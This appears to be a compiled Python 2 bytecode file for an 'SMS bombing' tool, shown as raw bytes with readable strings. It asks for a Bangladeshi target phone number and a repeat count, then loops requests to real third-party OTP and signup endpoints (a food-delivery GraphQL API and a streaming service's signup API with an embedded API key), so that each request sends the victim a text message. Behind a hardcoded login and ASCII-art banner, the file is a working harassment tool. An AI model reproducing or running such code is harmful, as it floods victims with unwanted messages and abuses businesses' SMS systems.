ó
ieâbc           @   s#  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l m Z d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j e  e j e j j   d d d[ g e _ d  d l m Z d  d l m Z d  d
 l m Z e e  e j d  e j   Z e j e  e j e j j   d d d\ g e _ e  j d  e Z d   Z e	 j  d e  Z! e! j"   e j# d  e$ Z d   Z% d   Z& d   Z' d   Z( d   Z% d   Z& d   Z' d   Z( d Z) e  j d  d   Z( e  j d  d   Z( e  j d  e( d  e  j d  d   Z* d Z+ g  Z, g  Z- g  Z. g  Z/ g  Z0 d Z1 d Z2 e  j d  d GHd  Z3 d! Z4 d" Z5 xV e5 d" k re6 d#  Z7 e7 e3 k rúe6 d$  Z8 e8 e4 k ròd% Z5 qÿd& GHq­d' GHq­We  j d  d( GHd  d l Z d  d l  Z  d  d l Z d  d l Z d  d l9 Z9 d)   Z( d  d l Z d  d l  Z  d  d l Z d  d l Z d  d l9 Z9 d* Z: d* Z; d+ Z< d, Z= d- Z> d. Z> d/ Z? d0 Z@ d1 ZA d2   ZB d3 GHe6 d4  ZC eD eE d5   ZF d6 GHd7 GHd7 GHxeG eF  D]ZH i d8 d9 6i eC d: 6d; d< 6d= d> 6d? d@ 6dA dB 6dC dD 6dE dF 6dG 6ZI e jJ dH dI eI ZK eK jL dJ k reB dK  n
 eB dL  i dM dN 6dO eC dP 6d" dQ 6d" dR 6dS dT 6ZI i dU dV 6ZM dW ZN e jJ eN dI eI dX eM ZK eK jL dJ k reB dY  qeB dZ  qWd S(]   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   t   datetimet   clearc          C   sE   x> t  j d g  D]* }  t r# Pn  t j j   t j d  q Wd  S(   Ns    PLEASE WAITg      Ð?(   t	   itertoolst   cyclet   donet   syst   stdoutt   flusht   timet   sleep(   t   c(    (    s   /sdcard/SMS.pyt   animate   s
    t   targetg      @c           C   s   d GHt  j j   d  S(   Ns   [1;97m{[1;91m![1;97m} Back(   t   osR
   t   exit(    (    (    s   /sdcard/SMS.pyt   keluar'   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t |  d  | 7} q Wt |  S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   /sdcard/SMS.pyt   acak,   s
    0c         C   s~   d } xA | D]9 } | j  |  } |  j d | d t d |   }  q W|  d 7}  |  j d d  }  t j j |  d  d  S(   NR   s   !%ss   %s;i   R   s   !0s   
(   t   indext   replacet   strR
   R   t   write(   R   R   R   t   j(    (    s   /sdcard/SMS.pyR   5   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
gñhãµøä>(   R
   R   R$   R   R   R   (   t   zt   e(    (    s   /sdcard/SMS.pyt   jalan@   s    c           C   s   d GHt  j j   d  S(   Ns   [1;91mExit(   R   R
   R   (    (    (    s   /sdcard/SMS.pyR   G   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjcR   R   i    i   (   R   R   R   R   R   (   t   bR   R   R   (    (    s   /sdcard/SMS.pyR    L   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR)   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   R!   R"   R#   R
   R   R$   (   R*   R   R   R%   R   (    (    s   /sdcard/SMS.pyR   U   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R
   R   R$   R   R   R   (   R&   R'   (    (    s   /sdcard/SMS.pyR(   `   s    s   
              ..           c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R
   R   R$   R   R   R   (   R&   R'   (    (    s   /sdcard/SMS.pyR(   j   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R
   R   R$   R   R   R   (   R&   R'   (    (    s   /sdcard/SMS.pyR(   s   s    s   [1;31m[1;96mdone[1;31m!c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;93mPlease Wait [1;93mg¹?(   R
   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/SMS.pyt   tik~   s
    i    s   [31mNot Vulns	   [32mVulnsx  
[1;91m##     ##[1;92m    ###[1;93m    ##     ##[1;94m    ###[1;95m    ########[1;96m  #### 
[1;91m###   ###[1;92m   ## ##[1;93m   ##     ##[1;94m   ## ##[1;95m   ##     ##[1;96m  ##  
[1;91m#### ####[1;92m  ##   ##[1;93m  ##     ##[1;94m  ##   ##[1;95m  ##     ##[1;96m  ##  
[1;91m## ### ##[1;92m ##     ##[1;93m #########[1;94m ##     ##[1;95m ##     ##[1;96m  ##  
[1;91m##     ##[1;92m #########[1;93m ##     ##[1;94m #########[1;95m ##     ##[1;96m  ##  
[1;91m##     ##[1;92m ##     ##[1;93m ##     ##[1;94m ##     ##[1;95m ##     ##[1;96m  ##  
[1;91m##     ##[1;92m ##     ##[1;93m ##     ##[1;94m ##     ##[1;95m ########[1;96m  ####
[1;95m__________[1;92m___________[1;95m___________[1;93m___________[1;95m___________

 â­â [1;91m AUTHOR [1;92m  :[1;93m MAHADI HASAN AFRIDI
 ââ [1;94m FACEBOOK[1;94m :[1;96m MAHADI HASAN AFRIDI
 ââ [1;93m GITHIB[1;92m   : [1;91mMAHADI-143
 ââ [1;92m TOOLS  [1;93m  : [1;94mSMS BOMBING
 â°â [1;91m NOTE  [1;94m   : [1;95mFREE TOOL
[1;95m__________[1;92m___________[1;95m___________[1;93m___________[1;95m___________t   MAHADIt   HASANt   truesA    â­â [1;32m TOOL USERNAME MAHADI 
 ââ [1;33m USERNAME : s@    ââ [1;32m TOOL PASSWORD HASAN 
 â°â [1;33m PASSWORD : t   falses(    [1;31mWrong Password [1;32mcontact mes(    [1;31mWrong Username [1;32mcontact mesy  
[1;91m##     ##[1;92m    ###[1;93m    ##     ##[1;94m    ###[1;95m    ########[1;96m  #### 
[1;91m###   ###[1;92m   ## ##[1;93m   ##     ##[1;94m   ## ##[1;95m   ##     ##[1;96m  ##  
[1;91m#### ####[1;92m  ##   ##[1;93m  ##     ##[1;94m  ##   ##[1;95m  ##     ##[1;96m  ##  
[1;91m## ### ##[1;92m ##     ##[1;93m #########[1;94m ##     ##[1;95m ##     ##[1;96m  ##  
[1;91m##     ##[1;92m #########[1;93m ##     ##[1;94m #########[1;95m ##     ##[1;96m  ##  
[1;91m##     ##[1;92m ##     ##[1;93m ##     ##[1;94m ##     ##[1;95m ##     ##[1;96m  ##  
[1;91m##     ##[1;92m ##     ##[1;93m ##     ##[1;94m ##     ##[1;95m ########[1;96m  ####
[1;95m__________[1;92m___________[1;95m___________[1;93m___________[1;95m___________

 â­â [1;91m AUTHOR [1;92m  :[1;93m MAHADI HASAN AFRIDI
 ââ [1;94m FACEBOOK[1;94m :[1;96m MAHADI HASAN AFRIDI
 ââ [1;93m GITHIB[1;92m   : [1;91mMAHADI-143
 ââ [1;92m TOOLS  [1;93m  : [1;94mSMS BOMBING
 â°â [1;91m NOTE  [1;94m   : [1;95mFREE TOOL
[1;95m__________[1;92m___________[1;95m___________[1;93m___________[1;95m___________
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R
   R   R$   R   R   R   (   R&   R'   (    (    s   /sdcard/SMS.pyR(   Ä   s    s   [94ms   [91ms   [97ms   [93ms   [1;32ms   [96ms   [0ms	   

[1;93mc         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g{®Gáz?(   R
   R   R$   R   R   R   (   R&   t   word(    (    s   /sdcard/SMS.pyt   logop×   s    s<    â­â [1;93mEXAMPLE [0171850**** 0181850**** 0161850****]s-    ââ [1;94mENTER YOUR TARGET NUMBER : +88s,    â°â [1;95mCHOOSE YOUR THREADS AMOUNT : sY   [1;95m__________[1;92m___________[1;95m___________[1;93m___________[1;95m___________R   sV  
mutation CreateOtp (
    $phone: PhoneNumber!
    $country: String!
    $uuid: String!
    $osVersionCode: String
    $deviceBrand: String
    $deviceModel: String
    $requestFrom: String
) {
    createOtp(
        auth: {
            phone: $phone,
            countryCode: $country,
            deviceUuid: $uuid,
            deviceToken: ""
        }
        device: {
            deviceType: WEB
            osVersionCode: $osVersionCode
            deviceBrand: $deviceBrand
            deviceModel: $deviceModel
        }
        requestFrom: $requestFrom
    ){
        statusCode
    }
}
t   queryt   phonet   880t   countrys$   64b9bb81-93f3-4757-9e92-9cfbf34d8039t   uuids   Linux armv8lt   osVersionCodet   Chromet   deviceBrandt   89t   deviceModels,   U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s=t   requestFromt	   variabless'   https://api-v4-2.hungrynaki.com/graphqlt   jsoniÈ   s    [1;92mSMS SEND SUCCESSFULs    [1;93mSMS SEND SUCCESSFULt   sendt   requestTypes   +880t   phoneNumbert   emailConsentt   whatsappConsents   cicas94417@iconmle.comt   emailt(   dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3s	   x-api-keys<   https://prod-api.viewlift.com/identity/signup?site=hoichoitvt   headerss    [1;94mSMS SEND SUCCESSFULs    [1;95mSMS SEND SUCCESSFUL(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(O   R   R
   R   t	   mechanizeR   R   R   t   hashlibt   ret	   threadingR@   t   getpasst   urllibt	   cookielibt   multiprocessing.poolR    t   requestst   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheaderst   systemR	   R   t   Threadt   tt   startR   t   TrueR   R    R   R(   t   logoR-   t   backt   berhasilt   cekpointt   okst   idt   listgrupt   vulnott   vulnt   CorrectUsernamet   CorrectPasswordt   loopt	   raw_inputt   usernamet   passwordt   smtplibt   bluet	   lightbluet   redt   whitet   greent   cyant   endt   yellowR3   R   t   intt   inputt   amountt   rangeR   t   datat   postt   rest   status_codet   headert   url(    (    (    s   /sdcard/SMS.pyt   <module>   sÊ   ¨

		
												
				<	<	E




	